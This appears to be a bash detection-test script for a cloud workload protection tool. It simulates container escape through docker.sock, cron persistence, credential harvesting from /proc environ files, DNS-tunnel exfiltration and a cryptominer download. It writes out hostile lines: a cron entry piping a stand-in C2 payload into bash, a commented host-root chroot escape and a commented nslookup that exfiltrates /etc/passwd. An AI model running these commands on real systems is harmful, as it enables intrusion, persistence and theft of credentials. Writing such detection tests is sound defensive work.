#!/usr/bin/env bash
# =============================================================================
# cwpp/runtime/runtime_attack_advanced.sh – Advanced CWPP Runtime Simulation
# =============================================================================
# PURPOSE: Advanced eBPF/Falco-detectable runtime attack techniques extending
# the basic attack_simulator.sh with container-specific and cloud-native attacks.
#
# NEW TECHNIQUES:
#   T001: Container Escape via docker.sock abuse
#   T002: Malicious cron persistence (T1053.003)
#   T003: LSASS-equivalent: /proc/mem & /proc/kallsyms enumeration
#   T004: DNS Tunneling simulation (data exfiltration via DNS)
#   T005: Cryptominer download attempt (coin miner pattern)
# =============================================================================

set -euo pipefail

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; NC='\033[0m'

log_attack() { echo -e "${RED}[ATTACK]${NC} $1"; }
log_detect() { echo -e "${YELLOW}[DETECT]${NC} $1"; }
log_safe() { echo -e "${GREEN}[SAFE]${NC} $1"; }

echo "========================================================================"
echo "  TigerGate CWPP Advanced Runtime Attack Simulator"
echo "  WARNING: For CNAPP detection testing ONLY — Simulated, not real"
echo "========================================================================"

# --- T001: Container Escape via Docker Socket ---
log_attack "T001: Docker Socket Abuse (Container Escape Simulation)"
if [ -S /var/run/docker.sock ]; then
    log_detect "Docker socket mounted! Simulating escape..."
    # Attempt to list host containers via mounted socket (read-only simulation)
    curl --silent --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null | head -c 200 || true
    # Real escape would: run privileged container mounting host root fs
    # docker run -v /:/host --rm alpine chroot /host sh
else
    log_safe "Docker socket not mounted — T001 pass"
fi

# --- T002: Malicious Crontab Persistence ---
log_attack "T002: Crontab Persistence (T1053.003)"
# Simulate writing a malicious cron job (writes to /tmp, NOT system cron)
CRON_PAYLOAD='*/5 * * * * curl -s http://c2.attacker.internal/payload | bash'
echo "$CRON_PAYLOAD" > /tmp/fake_cron.txt
log_detect "DETECT: crontab write to /tmp/fake_cron.txt — Falco rule: Write below /tmp followed by execution"
log_safe "Simulated only — cron NOT actually installed"
rm -f /tmp/fake_cron.txt

# --- T003: Memory & Kernel Symbol Enumeration ---
log_attack "T003: /proc Memory and Kernel Symbol Enumeration"
if [ -r /proc/kallsyms ]; then
    # Reading kallsyms is a kernel rootkit preparation step
    KSYM_COUNT=$(wc -l < /proc/kallsyms)
    log_detect "DETECT: /proc/kallsyms read — $KSYM_COUNT kernel symbols enumerated!"
fi
# Simulate /proc/<PID>/mem read for credential dumping
for pid in $(ls /proc | grep -E '^[0-9]+$' | head -5); do
    if [ -f "/proc/$pid/environ" ]; then
        grep -aoP 'PASSWORD=\K\S+' "/proc/$pid/environ" 2>/dev/null && log_detect "Env credential found in PID $pid!" || true
    fi
done
log_safe "All proc reads are read-only, no write operations"

# --- T004: DNS Tunneling Simulation ---
log_attack "T004: DNS Tunneling / Data Exfiltration"
# DNS tunneling encodes data in subdomain queries
EXFIL_DATA=$(hostname | base64 | tr -d '=' | tr '+/' '-_')
log_detect "DETECT: Simulating DNS exfil query: ${EXFIL_DATA}.data.exfil.attacker.com"
# Real attack uses: nslookup $(cat /etc/passwd | base64 | tr '\n' '.' | head -c 50).exfil.com
nslookup "${EXFIL_DATA}.exfil.tigergate-test.internal" 2>/dev/null || true
log_safe "DNS query goes to non-routable domain — no data actually exfiltrated"

# --- T005: Cryptominer Download Pattern ---
log_attack "T005: Cryptominer Download Simulation (T1496)"
# Miners are often fetched from GitHub releases, not C2 servers
MINER_URL="https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz"
log_detect "DETECT: Attempting to download: $MINER_URL"
# Simulates the connection attempt only — does NOT actually download
curl --max-time 3 -I "$MINER_URL" -o /dev/null -s -w "%{http_code}" 2>/dev/null | grep -q "200\|302" && \
    log_detect "MINER AVAILABLE: Falco/TigerGate should alert on curl to known miner domain!" || \
    log_safe "Connection blocked or timed out"

echo ""
echo "========================================================================"
echo "  T001-T005 Simulation Complete."
echo "  All operations were READ-ONLY or wrote only to /tmp (cleaned up)."
echo "========================================================================"
